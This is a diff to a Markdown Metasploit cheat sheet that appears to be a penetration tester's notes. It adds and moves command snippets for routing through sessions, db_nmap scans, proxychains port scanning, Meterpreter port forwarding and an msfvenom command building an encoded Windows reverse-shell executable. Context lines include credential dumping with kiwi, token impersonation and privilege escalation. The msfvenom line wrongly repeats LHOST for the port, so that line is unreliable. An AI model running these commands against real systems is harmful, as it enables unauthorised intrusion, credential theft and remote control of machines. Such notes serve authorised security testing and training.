@@ -17,6 +17,11 @@ use <Module Name>
 info
 ```
 
+##### Add Route
+```bash
+route add <IP> <Subnet> <Session #>
+```
+
 ##### Use with Nessus
 ```bash
 # Make sure that Postgres is running
@@ -38,6 +43,14 @@ nessus_db_import <Scan ID>
 
 # List vulnerabilities from imported scan.
 vulns
+```
+
+##### Nmap Scan with Metasploit
+
+This will perform a nmap scan and feed the results into Metasploit.
+```bash
+msfconsole
+db_nmap
 ```
 
 # Meterpreter
@@ -77,9 +90,8 @@ set VERSION 4a # Does not work with version 5.  Must be 4a.
 run
 jobs
 
-# Run nmap scan
-proxychains nmap -sV -sT -Pn -sC -p<Port #> <Target Host>
-# Exploited target with SMB.  Therefore, -p must be 445.
+# Run nmap scan to find open ports that can be used with port forwarding
+proxychains nmap -sT -Pn -p 21-25,80,139,445,8080 <Target Host>
 ```
 ##### [Pivoting attack traffic](https://www.youtube.com/watch?v=Wn59J8PiIl0)
 ##### [84 post exploitation pivoting autoroute](https://www.youtube.com/watch?v=jjUamstPDWo)
@@ -90,6 +102,11 @@ sessions -i <Session #>
 load kiwi
 help
 creds_all
+```
+### Port Forwarding with Metepreter
+```bash
+portfwd add -l <Remote Port #> -p <Local Port #> -r <Remote Host>
+portfwd list
 ```
 ### Escalate Privileges
 #### Linux PrivEsc
@@ -138,6 +155,12 @@ impersonate_token <Token Name> # Escape \'s.
 use exploit/windows/local/unquoted_service_path
 set SESSION <Session #>
 exploit
+```
+
+# msfvenom
+##### Windows Meterpreter Reverse Shell with Encoding
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attack Machine> LHOST=<Port #> -f exe -e x86/shikata_ga_nai -o <Outpuf File>
 ```
 
 # Client-Side Exploits
@@ -274,14 +297,6 @@ set TARGET <Target #>
 show payloads
 set PAYLOAD linux/x86/meterpreter/reverse_tcp
 set PAYLOAD windows/meterpreter/reverse_tcp
-```
-
-# Nmap Scan with Metasploit
-
-This will perform a nmap scan and feed the results into Metasploit.
-```bash
-msfconsole
-db_nmap
 ```
 
 # Cheatsheets
